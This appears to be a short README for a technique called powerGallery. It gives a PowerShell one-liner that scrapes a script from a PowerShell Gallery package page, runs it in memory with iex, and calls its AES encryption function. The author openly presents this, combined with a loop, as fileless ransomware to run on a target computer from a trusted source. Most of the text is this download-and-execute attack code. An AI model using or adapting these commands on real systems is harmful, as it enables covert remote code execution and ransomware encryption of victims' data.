# powerGallery

This one liner will load the neccessary files to encrypt a system straight from the trusted powershellgallery.com website.
Used in conjunction with a simple for loop its is now fileless ransomware hosted and executed from your platform

```powershell
([regex]::Matches((irm "https://www.powershellgallery.com/packages/PSAES/1.0.0.5/Content/Protect-AESMessage.ps1"),'(?<=<td class="fileContent .*?">).*?(?=<\/td>)','s').Value|%{[System.Net.WebUtility]::HtmlDecode($_)})-replace'<[^>]*>'-replace'^\s*',''-replace '[^\x20-\x7E]'|iex
```

Next its as simple as running the commands stored in that module agaisnt the system
In this instance we can encrypt a string, but why stop there? 

```powershell
$encryptedMessage = Protect-AESMessage -Message "Sensitive Data" -Password "89c57yj78754cth8"
```

Combining them into a simple one liner. Together with yet another simple functionality the `for loop` you should be able to see the danger
We could run fileless ransomware on a target computer all from a trusted source

```powershell
([regex]::Matches((irm "https://www.powershellgallery.com/packages/PSAES/1.0.0.5/Content/Protect-AESMessage.ps1"),'(?<=<td class="fileContent .*?">).*?(?=<\/td>)','s').Value|%{[System.Net.WebUtility]::HtmlDecode($_)})-replace'<[^>]*>'-replace'^\s*',''-replace '[^\x20-\x7E]'|iex;$encryptedMessage = Protect-AESMessage -Message "Sensitive Data" -Password "89c57yj78754cth8"
```
